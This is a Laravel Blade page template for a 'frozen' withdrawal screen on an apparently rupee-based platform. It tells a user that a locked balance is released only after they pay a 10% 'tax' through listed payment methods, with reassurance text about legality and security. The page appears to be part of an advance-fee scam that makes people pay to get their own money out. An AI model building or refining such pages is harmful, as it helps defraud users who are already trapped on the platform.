@if(!Auth::check())
<script>
  window.location.href = '/?modal=regquick';
</script>
@endif

@if(Auth::check() && Auth::user()->ban && request()->path() !== 'blocked')
@include('blocked')
@else
@auth

@php
$settings = \App\Setting::first();
$min_with = $settings->min_withdrawal_amount;

if (\Auth::user()->balance < $settings->frozen_amount && \Auth::user()->frozen == 1) {
  $min_with = 60000;
}

if(\Auth::user()->balance < 1500){
  $min_with = 1500;
}
@endphp

@php
$id = $_GET['id'] ?? null;

if (!$id) {
    header("Location: /withdrawals");
    exit;
}

$withdrawal = \App\WithdrawFrozen::where('id', $id)
    ->where('user_id', auth()->id())
    ->first();

if (!$withdrawal) {
    header("Location: /withdrawals");
    exit;
}
@endphp

@php
function inr($n) {
    $n = number_format((float)$n, 2, '.', '');
    [$i, $d] = explode('.', $n);
    return (strlen($i) > 3)
        ? preg_replace('/\B(?=(\d{2})+(?!\d))/', ',', substr($i, 0, -3)) . ',' . substr($i, -3) . '.' . $d
        : $i . '.' . $d;
}

function safe_div($a, $b, $precision = 2) {
    if (empty($b) || $b == 0) {
        return 0;
    }
    return round($a / $b, $precision);
}
@endphp

<link rel="stylesheet" href="./styles/output.css?v=2" />
<div class="globalContainer globalContainer_output">
  <div class="screenWrapper">
    <div class="pagesContainer">
      <div class="up_page up_page_1">
        <div class="up_header">
          <button onclick="window.location.href='/withdrawals'" class="up_back_button">
            <img src="./img/arrow.svg" alt="">{{ __('common.back') }}
          </button>
          <div class="up_h1">{{ __('common.withdrawal') }}</div>
        </div>

        <div class="up_container">
          <div class="up_balance-box">
            <p class="up_balance-label">{{ __('common.available-balance') }}</p>
            <p class="up_balance-amount">₹ {{ inr($withdrawal->amount) }}</p>
          </div>

          <div class="up_warning-title">
            <div class="up_warning-indicator"></div>
            {{ __('common.frozen-warning') }}
          </div>

          <div id="goPayBlock" class="up_alert" style="margin-top: 25px;">
            <div class="up_flex-row" style="justify-content: space-between;">
              <p class="up_text-muted">{{ __('common.amount-to-pay') }}</p>
              <p class="up_text-muted">{{ __('common.tax-percentage') }}</p>
            </div>
            <div class="up_flex-row" style="justify-content: space-between;">
              <p class="up_text-dark up_res_10" style="font-weight: 700; font-size: 18px;">
                ₹ {{ inr(safe_div($withdrawal->amount, 10)) }}
              </p>
              <p class="up_text-dark" style="font-weight: 700; font-size: 18px;">10.00%</p>
            </div>
          </div>

          <div class="up_text-start up_text-dark"
            style="margin-top: 25px; display: flex; align-items: center; gap: 10px; font-weight: 700;">
            <div class="up_success-indicator"></div>
            <div>
              {{ __('common.after-payment') }} <span class="up_green-text up_balance-amount">₹ {{ inr($withdrawal->amount) }}</span>.
            </div>
          </div>

          <p class="up_info-section-title">{{ __('common.select-payment-method') }}</p>

          <div class="up_methods_pay">
            @php 
              $systemDeps = \App\SystemDep::orderBy('sort', 'asc')->orderBy('id', 'asc')->where('off', 0)->get(); 
            @endphp
            @foreach($systemDeps as $s)
              <a href="javascript:void(0)" class="up_item_pay_other" data-method-id="{{ $s->id }}" data-method-name="{{ $s->name }}">
                <img src="{{ $s->img }}" alt=""><span>{{ $s->name }}</span>
              </a>
            @endforeach
          </div>

          <button type="button" class="up_reg-btn" style="margin-top: 25px;" id="btn-pay" disabled>
            {{ __('common.pay') }}
          </button>

          <div>
            <p class="up_info-section-title">{{ __('common.how-to-withdraw') }}</p>
            <p class="up_min-text">{{ __('common.frozen-explanation') }}</p>
            <br />
            <p class="up_min-title">{{ __('common.what-we-do') }}</p>
            <p class="up_min-text">{{ __('common.we-cover-half') }}</p>
            <br />
            <p class="up_min-title">{{ __('common.what-you-do') }}</p>
            <p class="up_min-text">{{ __('common.pay-10-percent') }}</p>
            <br />
            <p class="up_min-title">{{ __('common.why-needed') }}</p>
            <ul class="up_min-text" style="padding-left: 15px;">
              <li>{{ __('common.legality') }}</li>
              <li>{{ __('common.transparency') }}</li>
              <li>{{ __('common.security') }}</li>
            </ul>
            <br />
            <p class="up_min-text">{{ __('common.support-info') }}</p>
          </div>

          <a href="#goPayBlock" class="up_pay_button_learn" style="color: #19AB59;">
            {{ __('common.ready-to-pay') }}
          </a>

          <a target="_blank" href="{{ $settings->support_contact }}" class="up_login-btn" style="margin-top: 10px;">
            {{ __('common.support') }}
          </a>
        </div>
      </div>
    </div>
  </div>
</div>

<script>
  const amount_full = @json(safe_div($withdrawal->amount, 10));
</script>
<script src="./scripts/output.js?v=2032222222222222222222222222"></script>

@else
<script type="text/javascript">
  location.href = '/';
</script>
@endauth
@endif
